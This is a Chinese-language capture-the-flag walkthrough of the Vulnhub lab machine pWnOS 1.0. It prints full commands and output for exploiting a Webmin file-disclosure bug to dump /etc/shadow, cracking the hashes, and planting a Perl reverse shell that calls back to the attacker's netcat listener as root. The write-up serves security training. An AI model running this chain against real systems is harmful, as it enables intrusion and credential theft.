---
title: Vulnhub-pWnOS 1 0
published: 2025-03-09 16:17:52
tags: [Vulnhub]
category: 靶机
draft: false
---

# pWnOS: 1.0

> [https://www.vulnhub.com/entry/pwnos-10,33/](https://www.vulnhub.com/entry/pwnos-10,33/)
> 

## 主机发现端口扫描

1. 探测存活主机，`152`为靶机
    
    ```php
    nmap -sP 192.168.75.0/24           
    //      
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-25 10:28 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00023s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00025s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.152 //靶机
    Host is up (0.00072s latency).
    MAC Address: 00:0C:29:5E:18:C9 (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00012s latency).
    MAC Address: 00:50:56:FB:E7:F4 (VMware)
    Nmap scan report for 192.168.75.151
    Host is up.
    ```
    
2. 扫描主机所有端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.152
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-25 10:29 CST
    Nmap scan report for 192.168.75.152
    Host is up (0.0023s latency).
    Not shown: 65530 closed tcp ports (conn-refused)
    PORT      STATE SERVICE
    22/tcp    open  ssh
    80/tcp    open  http
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    10000/tcp open  snet-sensor-mgmt
    MAC Address: 00:0C:29:5E:18:C9 (VMware)
    ```
    
3. 扫描服务版本及系统版本
    
    ```php
    nmap -sT -sV -O -p22,80,139,445,10000 192.168.75.152   
    //        
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-25 10:30 CST
    Nmap scan report for 192.168.75.152
    Host is up (0.00044s latency).
    
    PORT      STATE SERVICE     VERSION
    22/tcp    open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
    80/tcp    open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
    139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
    445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
    10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
    MAC Address: 00:0C:29:5E:18:C9 (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 2.6.X
    OS CPE: cpe:/o:linux:linux_kernel:2.6.22
    OS details: Linux 2.6.22 (embedded, ARM), Linux 2.6.22 - 2.6.23
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
4. 扫描漏洞
    
    ```sql
    nmap -script=vuln -p22,80,139,445,10000  192.168.75.152
    //+
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-25 10:31 CST
    Stats: 0:04:48 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.36% done; ETC: 10:36 (0:00:02 remaining)
    Nmap scan report for 192.168.75.152
    Host is up (0.00050s latency).
    
    PORT      STATE SERVICE
    22/tcp    open  ssh
    80/tcp    open  http
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    | http-enum: 
    |   /icons/: Potentially interesting directory w/ listing on 'apache/2.2.4 (ubuntu) php/5.2.3-1ubuntu6'
    |   /index/: Potentially interesting folder
    |_  /php/: Potentially interesting directory w/ listing on 'apache/2.2.4 (ubuntu) php/5.2.3-1ubuntu6'
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-slowloris-check: 
    |   VULNERABLE:
    |   Slowloris DOS attack
    |     State: LIKELY VULNERABLE
    |     IDs:  CVE:CVE-2007-6750
    |       Slowloris tries to keep many connections to the target web server open and hold
    |       them open as long as possible.  It accomplishes this by opening connections to
    |       the target web server and sending a partial request. By doing so, it starves
    |       the http server's resources causing Denial Of Service.
    |       
    |     Disclosure date: 2009-09-17
    |     References:
    |       http://ha.ckers.org/slowloris/
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
    |_http-trace: TRACE is enabled
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    10000/tcp open  snet-sensor-mgmt
    | http-vuln-cve2006-3392: 
    |   VULNERABLE:
    |   Webmin File Disclosure
    |     State: VULNERABLE (Exploitable)
    |     IDs:  CVE:CVE-2006-3392
    |       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
    |       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
    |       to bypass the removal of "../" directory traversal sequences.
    |       
    |     Disclosure date: 2006-06-29
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392
    |       http://www.exploit-db.com/exploits/1997/
    |_      http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure
    MAC Address: 00:0C:29:5E:18:C9 (VMware)
    
    Host script results:
    |_smb-vuln-ms10-054: false
    |_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
    |_smb-vuln-ms10-061: false
    
    ```
    
    扫描出`miniserv`迷你服务器搭建的`webmin`，并且扫出它的任意文件读取漏洞`cve2006-3392` ，还有一些会令人感兴趣的文件
    

## web渗透

因为扫描出了任意文件读取漏洞，就从漏洞开始入手

1. 使用`msf`利用漏洞，读取 `/etc/pass` 和 `/etc/shadows`
    
    ```sql
    msf6 > use auxiliary/admin/webmin/file_disclosure 
    msf6 auxiliary(admin/webmin/file_disclosure) > show options // 查看需要配置的
    msf6 auxiliary(admin/webmin/file_disclosure) > set rhosts 192.168.75.152
    msf6 auxiliary(admin/webmin/file_disclosure) > set rpath /etc/passwd //读取/etc/pass
    msf6 auxiliary(admin/webmin/file_disclosure) > exploit
    //读取到
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/bin/sh
    bin:x:2:2:bin:/bin:/bin/sh
    sys:x:3:3:sys:/dev:/bin/sh
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/bin/sh
    man:x:6:12:man:/var/cache/man:/bin/sh
    lp:x:7:7:lp:/var/spool/lpd:/bin/sh
    mail:x:8:8:mail:/var/mail:/bin/sh
    news:x:9:9:news:/var/spool/news:/bin/sh
    uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
    proxy:x:13:13:proxy:/bin:/bin/sh
    www-data:x:33:33:www-data:/var/www:/bin/sh
    backup:x:34:34:backup:/var/backups:/bin/sh
    list:x:38:38:Mailing List Manager:/var/list:/bin/sh
    irc:x:39:39:ircd:/var/run/ircd:/bin/sh
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
    nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
    dhcp:x:100:101::/nonexistent:/bin/false
    syslog:x:101:102::/home/syslog:/bin/false
    klog:x:102:103::/home/klog:/bin/false
    mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false
    sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
    vmware:x:1000:1000:vmware,,,:/home/vmware:/bin/bash
    obama:x:1001:1001::/home/obama:/bin/bash
    osama:x:1002:1002::/home/osama:/bin/bash
    yomama:x:1003:1003::/home/yomama:/bin/bash
    ```
    
    把`path`设置为`/etc/shadow` 读取
    
    ```sql
    //etc/shadow
    root:$1$LKrO9Q3N$EBgJhPZFHiKXtK0QRqeSm/:14041:0:99999:7:::
    daemon:*:14040:0:99999:7:::
    bin:*:14040:0:99999:7:::
    sys:*:14040:0:99999:7:::
    sync:*:14040:0:99999:7:::
    games:*:14040:0:99999:7:::
    man:*:14040:0:99999:7:::
    lp:*:14040:0:99999:7:::
    mail:*:14040:0:99999:7:::
    news:*:14040:0:99999:7:::
    uucp:*:14040:0:99999:7:::
    proxy:*:14040:0:99999:7:::
    www-data:*:14040:0:99999:7:::
    backup:*:14040:0:99999:7:::
    list:*:14040:0:99999:7:::
    irc:*:14040:0:99999:7:::
    gnats:*:14040:0:99999:7:::
    nobody:*:14040:0:99999:7:::
    dhcp:!:14040:0:99999:7:::
    syslog:!:14040:0:99999:7:::
    klog:!:14040:0:99999:7:::
    mysql:!:14040:0:99999:7:::
    sshd:!:14040:0:99999:7:::
    vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::
    obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::
    osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::
    yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::
    ```
    
2. 尝试使用`john`破解带有`shell`的用户
    
    ```sql
    //1.txt
    root:$1$LKrO9Q3N$EBgJhPZFHiKXtK0QRqeSm/:14041:0:99999:7:::
    vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::
    obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::
    osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::
    yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::
    ```
    
    使用`rockyou`字典
    
    ```sql
    john --wordlist=/usr/share/wordlists/rockyou.txt 1.txt 
    //
    john --wordlist=/usr/share/wordlists/rockyou.txt 1.txt        
    Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
    Use the "--format=md5crypt-long" option to force loading these as that type instead
    Using default input encoding: UTF-8
    Loaded 5 password hashes with 5 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
    Will run 8 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    h4ckm3           (vmware)     
    1g 0:00:08:19 DONE (2024-09-25 11:49) 0.002002g/s 28228p/s 128126c/s 128126C/s !!!0mc3t..*7¡Vamos!
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed. 
    ```
    
    破解出了用户`vmware` 的密码 `h4ckm3` 
    

## 获得shell并提权

1. 使用ssh登录破解出来的用户，获得shell
    
    ```sql
    ssh -oHostKeyAlgorithms=+ssh-dss vmware@192.168.75.152
    The authenticity of host '192.168.75.152 (192.168.75.152)' can't be established.
    DSA key fingerprint is SHA256:r69naj+dUdsNI77F8/FCC9zwpVPk1rzzEdT5znXT/Lo.
    This key is not known by any other names.
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added '192.168.75.152' (DSA) to the list of known hosts.
    vmware@192.168.75.152's password: 
    Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686
    
    The programs included with the Ubuntu system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.
    
    Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
    applicable law.
    Last login: Fri Jun 20 14:35:37 2008
    vmware@ubuntuvm:~$ 
    ```
    
2. 查看权限
    
    ```sql
    vmware@ubuntuvm:~$ uname -a
    Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux
    vmware@ubuntuvm:~$ id
    uid=1000(vmware) gid=1000(vmware) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),111(lpadmin),112(admin),1000(vmware)
    vmware@ubuntuvm:~$ sudo -l
    [sudo] password for vmware:
    Sorry, user vmware may not run sudo on ubuntuvm.
    ```
    
3. 提权
    - 发现`cron.d`里面有个root权限运行的自动化任务，但是不支持写入
    - 没找到什么可以提权的点，查看wp，发现`webmin`文件夹带有root权限
        
        ```sql
        vmware@ubuntuvm:/var$ ls -al | grep 'webmin'
        drwx------  2 root bin   4096 2008-06-10 13:31 webmin
        ```
        
        因为我们之前获取的`shadow`文件是要`root`权限才能获取的，利用的是`webmin`本文件包含漏洞，所以我们可以把反弹`shell`文件放到靶机然后利用漏洞包含`shell` 文件
        
    - 因为`webmin`是通过`perl`写的，所以需要使用`cgi`后缀的文件(`perl`环境下的可执行文件)
        
        ```sql
        // /usr/share/webshells/ 是kali中一个常见的路径，用于存放 web shell 文件。这些文件通常是用于测试或攻击的脚本
        cp /usr/share/webshells/perl/perl-reverse-shell.pl perl-reverse-shell.cgi 
        // 开启web服务方便主机下载
        php -S 0:80
        ```
        
    - 靶机下载shell文件，存放在家目录
        
        ```sql
        vmware@ubuntuvm:~$ wget http://192.168.75.151/perl-reverse-shell.cgi
        --02:20:10--  http://192.168.75.151/perl-reverse-shell.cgi
                   => `perl-reverse-shell.cgi'
        Connecting to 192.168.75.151:80... connected.
        HTTP request sent, awaiting response... 200 OK
        Length: 3,712 (3.6K)
        
        100%[===========================================================================>] 3,712         --.--K/s             
        
        02:20:10 (189.12 MB/s) - `perl-reverse-shell.cgi' saved [3712/3712]
        
        vmware@ubuntuvm:~$ mv perl-reverse-shell.cgi shell.cgi // 重命名
        vmware@ubuntuvm:~$ chmod +x shell.cgi  // 添加可执行权限
        vmware@ubuntuvm:~$ ls -al //查看权限
        ```
        
    - 修改`shell.cgi`文件参数
        
        ```sql
             // vim shell.cgi
             45 my $ip = '192.168.75.151'; //kali 的 ip
             46 my $port = 1234; // 端口
        ```
        
    - 回到kali，运行`msf`，使用`webmin`的文件包含漏洞，将`path`改为`/home/vwware/shell.cgi`
        
        同时开始监听1234端口，等待反弹shell
        
        ```sql
        nc -lvp 1234
        //
        listening on [any] 1234 ...
        ```
        
        运行`msf`，并利用`webmin`的本地文件包含漏洞包含`shell.cgi`
        
        ```sql
        msf6 > use auxiliary/admin/webmin/file_disclosure 
        msf6 auxiliary(admin/webmin/file_disclosure) > show options
        msf6 auxiliary(admin/webmin/file_disclosure) > set rhosts 192.168.75.152 // 靶机ip
        msf6 auxiliary(admin/webmin/file_disclosure) > set rpath /home/vmware/shell.cgi //shell.cgi的路径
        msf6 auxiliary(admin/webmin/file_disclosure) > exploit
        ```
        
        `exploit`完毕后`nc`已经连接到`root`账户了
        
        ```sql
        nc -lvp 1234
        listening on [any] 1234 ...
        192.168.75.152: inverse host lookup failed: Unknown host
        connect to [192.168.75.151] from (UNKNOWN) [192.168.75.152] 52459
         02:29:10 up  5:02,  1 user,  load average: 0.00, 0.00, 0.00
        USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
        vmware   pts/0    192.168.75.151   22:53   22.00s  0.14s  0.14s -bash
        Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux
        uid=0(root) gid=0(root)
        /
        /usr/sbin/apache: can't access tty; job control turned off
        ```
        
        ```sql
        # whoami
        //
        root
        ```
        

## 思路

通过CMS自带的本地文件包含漏洞，因为能包含shadow文件，所以带有root权限，所以获得初级shell时上传反弹shell脚本到靶机目录，然后通过靶机本地文件包含漏洞包含shell脚本即可反弹shell